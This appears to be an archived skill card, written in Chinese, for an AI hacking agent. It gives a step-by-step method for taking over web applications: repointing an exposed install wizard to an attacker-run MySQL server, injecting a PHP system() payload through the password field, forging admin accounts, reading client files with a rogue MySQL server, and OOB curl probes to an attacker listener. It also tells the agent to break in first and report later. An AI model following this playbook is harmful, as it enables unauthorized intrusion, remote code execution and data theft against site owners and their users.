<!-- archived from /root/.hermes/skills/security/app-db-repoint-takeover/SKILL.md on 2026-10-21 -->

---
name: app-db-repoint-takeover
description: "Use when 应用库配置可改/有安装向导. 连我库→伪造超管进后台。"
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
---

> 归档卡：原目录 `/root/.hermes/skills/security/app-db-repoint-takeover`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/app-db-repoint-takeover/…')`，不要相对 `references/legacy/` 解析。

# 应用库重定向接管 (app-db-repoint-takeover)

## 触发
- 目标**暴露安装向导**(`install.php` / `setup.php` / `install/`)且**没有 lock 文件**;或任何能把「数据库主机/用户/口令/库名」写进配置的入口(后台配置页、config 写入接口、代码生成器的 `dbName` 参数)。
- 或你已能改应用的库配置(改配置、改 hosts、改上游 DSN)。
- 前提三件:**应用会主动发起连接**(不是只做本地校验)、你有一台**目标可直连的 MySQL**(跳板即可)、库用户用 `mysql_native_password`(老 PHP 客户端连 MySQL8 的 `caching_sha2_password` 会认证失败)。

## 心法
「应用连我的库」= 拿到它的**数据面**:它每条 SQL 从你眼前过(表结构/设置键名/业务数据),所有业务配置由你改写,管理员表由你伪造 ⇒ 进后台、再找 shell 面。
**先拿数据面,再往代码执行走**;数据面本身不是 shell,别在报告里当成 shell。
兄弟手法: `fake-auth-server-redirect`(让应用连假的认证服务)、`database-host-postexploit`(拿到 sysadmin 之后)。

## 步骤

### 0. 备好假库与「payload 口令」
- 在跳板 MySQL 上建用户,**并用 `mysql_native_password`**。
- **核心技巧: 把要写进应用配置的口令字段设成一个 PHP payload**,再把你 MySQL 上该用户的密码设成**该 payload 求值后的固定串**(例 `xx`)⇒ 应用连你的库是通的,同时配置里留着一个执行点。payload 形状规则见「陷阱」第 2 条。
- 先用**无害凭据**确认连通(安装器的 `?action=test_connection` 这类独立 AJAX 就是现成 oracle),再用**垃圾凭据**确认它不是 stub(必须返回失败)。**注意 oracle 可能有副作用**:实测 `test_connection` 会真 `CREATE DATABASE IF NOT EXISTS` ⇒ 动手前记基线,diff 出它多建的库。

### 1. 读透安装契约,再发请求
- GET 安装页 → 读**内联 JS**:探测 AJAX 端点及各字段名(常见短名 `host/username/password/database`);读 step 表单:
  `<form method="POST" action="install.php?step=2"><button name="install_mode" value="fresh">`。
- **表单里没有隐藏 input ⇒ 凭据存在 session**:step1 与 step2 必须**同一个 cookie jar / 同一 Session 对象**连发,否则 step2 恒失败(且报错不点明是 session 丢)。
- 步骤条(页头 `1 2 3`)= 多步;step1 只做「建库 + SHOW TABLES + 判空」,**step2 才建表/导入/写配置**。

### 2. 先开观测窗(不然根本无法验收)
- 在**你的** MySQL 上:`SELECT @@general_log, @@log_output;`
  - `TABLE` ⇒ 日志在 `mysql.general_log` **表**里(文件不增长,**别用 `wc -l` 判断**)。
  - `general_log_file` 指向不存在目录会 `ERROR 1231` ⇒ 用默认 datadir,或先 `mkdir -p` 并 `chown mysql:`。
- 这个日志 = 你的**验收器 + 情报源**:能看到对方每条 SQL、每个设置键名、真实表结构,以及**它现在到底连的是谁**。

### 3. 同 session 连发 step1 → step2,判定成功
成功 = 页面出现「安装成功」/lock 文件出现/你的库里多出他们导入的表。

### 4. ★ 验证「配置是否真的生效」(最易误判的一步)
- 访问应用任意**会查库**的端点,再回看你的 general_log。
- 有他们的查询 = 生效 ✓;**没有 = 应用读的是另一个配置文件** —— 安装器常只写**应用子目录**那份(如 `<app>/.env`),而外壳页/管理端读根目录那份。
- **铁律:「安装成功」≠「应用改用我的库」。** 只有数据面证据算数。

### 5. 用日志精确挖掘设置键名
- 打各 action/页面,读 general_log 里 `WHERE setting_key IN ('a','b',…)` 的**原文** = 权威键名清单。
- **别猜前缀**:少一个前缀(实测 `ad_filter_`)改了也没用,白跑好几轮。
- 反向利用:这些键就是应用的**行为开关**(白名单/功能开关/上游地址),改完即改应用行为。

### 6. 伪造管理员 → 进后台
- 应用的管理员表就是普通表:插一行 bcrypt(`$2y$10$…`),或直接用你**在安装表单里自填的管理员账号**。
- 登录判定:成功 = 302/跳转 + 能拿到后台页;失败 = 同一页 + 文案。
- **一次性图形验证码**(`?captcha=<rand>`):同 session 抓图、服务端校验、**单次使用** ⇒ 每次尝试都要新读一张图,**用户名枚举/口令爆破的成本 = 每轮一次**,别把它当主线。自己读图(放大 6–10x),不写 OCR。

### 7. 从后台/API 找 shell 面
见 `references/db-control-to-shell-surface.md`(上传 / 可控删文件 / 缓存落 webroot / HLS 改写 / 数据注入同源 JS / 服务端下载型设置)。

### 8. 回滚
- 用同一条链把配置写回原值(原值从你的 general_log 历史连接、同箱其它 vhost 配置、泄露文件里找)。
- 目标:站点功能恢复、我们新增的账号/文件清掉。**改库配置会把生产站打死**(配置指向你的空库)——所以要留「能连库且无害」的中间值,别留半死状态。

## 陷阱
1. **`disable_functions` 是默认陷阱**:宝塔/主机商默认禁 `system,exec,shell_exec,passthru,popen,proc_open`。注入进配置的 `system()` 会**静默失败**(返回空 ⇒ 配置值变成你设的固定串),**绝不能**用「响应里没回显」判断没有代码执行。
   证明/证伪: **计时**(`?参数=sleep 6` 看响应耗时)+ **OOB**(`?参数=curl http://你的监听/xxx`)。要真命令执行就把函数换成**未被禁的写文件类**(`file_put_contents`/`fwrite`)。
2. **payload 必须「模板双兼容 + 求值固定」**:要同时在 `'pass' => 'PAYLOAD',`(直接拼接)与 `Env::get('db.password','PAYLOAD')`(被包裹)两种模板下语法合法 ⇒ **引号与括号自平衡**。已验形状:`x' . system($_GET[0] ?? '') . 'x`。
   - `?? ''` 防未定义索引 notice;空参求值恒为 `xx` ⇒ 把 MySQL 用户密码也设成 `xx`。
   - 旧式 `x') . system($_GET[0]) . ('x` 在**直接拼接**模板下括号不平衡 ⇒ 整文件 parse error ⇒ 站点白屏(**纯破坏,别用**)。
3. **安装锁**:`install.lock` 一旦生成,安装器立刻变「已安装」页,step1/step2 全被拒。想复用安装器做注入,先找**可控删文件原语**(缓存清理/过期清理/备份删除/日志轮转)把锁删掉。
4. **别把 HTTP 200 / 页面形状当结论**:一律以 general_log、表内容、响应耗时、OOB 命中为准。
5. **回显型 SSRF 的通病**:若 SSRF 被「域名特征白名单」拦住(报 `URL不匹配域名特征`),白名单常常也在**同一个设置表**里(你已可控);放行后若应用**要求响应体像某类型**(如 m3u8)才回显,则只能退化为端口/服务探测 + OOB,不能直读内容。
6. **Rogue MySQL(`LOAD DATA LOCAL INFILE` 回读客户端文件)先验前置**:PHP mysqli 默认 `allow_local_infile` 关;PDO 需显式 `MYSQL_ATTR_LOCAL_INFILE`。
   判据:**若你「收到的文件内容」其实是客户端下一条 SQL**,说明客户端拒绝了该请求 ⇒ **立刻停**,别在这条链上继续投入。
   (协议正确姿势:认证 OK 后先读客户端第一条 query 如 `SET NAMES …`,再回 `0xFB + 路径`。)
7. **不要 kill 目标服务来抢端口**:要在跳板上截获某端口的连接(如让它连我们的伪库)用 **NAT 重定向**,不动服务本身:
   `iptables -t nat -A PREROUTING -p tcp --dport 3306 -j REDIRECT --to-port 3307`(**收工务必 `-D` 撤掉**;`iptables -t nat -L -n` 复核)。
8. **Python 拼 SQL/URL 时别用 `%` 格式化**:SQL 里的 `%` 通配符会触发 `ValueError: unsupported format character` ⇒ 用拼接或 f-string(且 SQL 里的 `%` 原样保留)。
9. **动手前记基线**(关键页面 md5/状态码/库表),事后才分得清哪些是你造成的痕迹。

## 交付纪律(本用户)
- 先进入再汇报,别用未成功的中间过程刷屏;目标打通/决定放弃时给**结构化**结论。
- 动生产前先答「**能不能恢复**」并保留原值;改完把口令改成仍可连库的值,别把站点直接打死。
- 高价值面(后台/webshell/资金链)拿到立即报,不等轮次。
- 不索要账号:技术面打穿。凭据进报告一律 [REDACTED]。

## 关联
- `references/db-repoint-recipe.md` — 可直接复制的 SQL/请求契约/验收清单(假库与 payload 口令、step1/step2、general_log 查询、伪造管理员)
- `references/db-control-to-shell-surface.md` — 数据面到手后往 shell 走的滥用面清单与判据
- 跨卡: `whitelabel-tvbox-pentest`(本打法的家族实例: wgart/无歌播放器)、`fake-auth-server-redirect`、`database-host-postexploit`、`remote-exec-script-harness`(跳板执行/落盘纪律)
